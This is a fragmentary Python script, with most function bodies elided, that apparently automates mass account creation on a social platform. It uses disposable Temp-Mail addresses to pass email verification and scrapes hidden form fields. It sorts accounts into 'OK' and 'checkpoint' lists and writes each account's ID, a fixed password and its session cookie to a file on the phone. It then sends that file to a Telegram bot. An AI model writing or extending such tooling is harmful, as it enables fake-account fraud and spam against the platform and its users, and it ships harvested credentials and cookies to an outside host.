...
# Initialize lists to track OK and CP accounts
oks = []
cps = []
...
# Function to extract hidden input fields from HTML
def extractor(data):
    try:
...
# Function to get a temporary email from Temp-Mail API
def GetEmail():
    response = requests.post('https://api.internal.temp-mail.io/api/v3/email/new').json()
    return response['email']

# Function to get the code from the temporary email
def GetCode(email):
    try:
...
# Function to send the file to Telegram bot
def send_to_telegram(file_path, chat_id, bot_token):
    ...
    if response.status_code == 200:
        print(f"{X} File sent successfully to Telegram.")
    else:
        print(f"{X} Failed to send file to Telegram. Error: {response.text}")

# Modify the confirm_id function to send the file after successful writing
def confirm_id(mail, uid, otp, data, ses):
    try:
        ...
        if "checkpoint" in str(response.url):
            ...
            # Write to SUCCESS-OK-ID.txt
            with open("/sdcard/SUCCESS-OK-ID.txt", "a") as file:
                file.write(f"{uid}|MrCode@123|{cookie}\n")
            
            # Send the file to Telegram
            send_to_telegram("/sdcard/SUCCESS-OK-ID.txt", chat_id, bot_token)
